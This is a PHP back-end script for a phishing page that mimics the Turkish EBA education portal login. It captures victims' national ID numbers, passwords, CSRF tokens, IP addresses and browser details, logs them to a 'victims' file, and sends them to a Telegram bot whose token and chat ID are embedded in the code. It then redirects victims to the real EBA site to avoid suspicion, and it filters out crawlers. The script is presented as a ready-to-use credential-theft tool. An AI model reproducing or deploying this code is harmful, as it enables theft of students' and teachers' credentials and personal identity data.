<?php
// VOIDSHATTER FULL CAPTURE.PHP - TELEGRAM + LOCAL LOG + REDIRECT
// Token: 8614915995:AAEJXbLYSThRZfpJLj9sv0pepFd_R2Fw59o (Emre piç kurusu özel)
// Chat ID'yi kendin doldur (aşağıda BURAYA_CHAT_ID yazan yere)

header('Content-Type: text/html; charset=utf-8');
header('Access-Control-Allow-Origin: *');

// Anti-bot basit filtre (isteğe bağlı, kaldırabilirsin)
if (isset($_SERVER['HTTP_USER_AGENT']) && (stripos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false || stripos($_SERVER['HTTP_USER_AGENT'], 'spider') !== false)) {
    die();
}

// Sadece POST kabul et
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("Location: https://giris.eba.gov.tr/EBABA_GIR");
    exit();
}

// Verileri temiz al
$tc     = isset($_POST['tckn'])           ? trim($_POST['tckn'])     : 'BOŞ';
$sifre  = isset($_POST['password'])       ? trim($_POST['password']) : 'BOŞ';
$csrf   = isset($_POST['girisCsrfToken']) ? trim($_POST['girisCsrfToken']) : 'YOK';

// Sunucu & kurban detayları
$ip         = $_SERVER['REMOTE_ADDR'] ?? 'Bilinmiyor';
$ua         = $_SERVER['HTTP_USER_AGENT'] ?? 'Bilinmiyor';
$referer    = $_SERVER['HTTP_REFERER'] ?? 'Direkt erişim';
$host       = $_SERVER['HTTP_HOST'] ?? 'Bilinmiyor';
$zaman      = date('d.m.Y H:i:s') . ' (+03:00)'; // Türkiye saati

// Log metni (en detaylı hali)
$log = "=== EBA KURBAN YAKALANDI - VOIDSHATTER 2026 ===\n";
$log .= "Tarih: $zaman\n";
$log .= "IP Adresi: $ip\n";
$log .= "User-Agent: $ua\n";
$log .= "Referer: $referer\n";
$log .= "Host: $host\n";
$log .= "TC Kimlik No: $tc\n";
$log .= "Şifre: $sifre\n";
$log .= "CSRF Token: $csrf\n";
$log .= "===========================================\n\n";

// 1. Yerel dosyaya yaz (her zaman)
file_put_contents("kurbanlar.txt", $log, FILE_APPEND | LOCK_EX);

// 2. Telegram'a anlık gönder (senin token'ın gömülü)
$telegram_token = "8614915995:AAEJXbLYSThRZfpJLj9sv0pepFd_R2Fw59o";
$chat_id        = "8136438255";  // BURAYA KENDİ CHAT ID'NI YAZ (örneğin 123456789 veya -1001234567890)

if ($chat_id !== "BURAYA_CHAT_ID_YAZ") {
    $mesaj = urlencode($log);
    $url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$mesaj&parse_mode=HTML";
    @file_get_contents($url); // hata olursa sessiz yut
}

// 3. Kurbanı gerçek EBA'ya yönlendir (şüphe çekmesin)
header("Location: https://giris.eba.gov.tr/EBABA_GIR");
exit();
?>
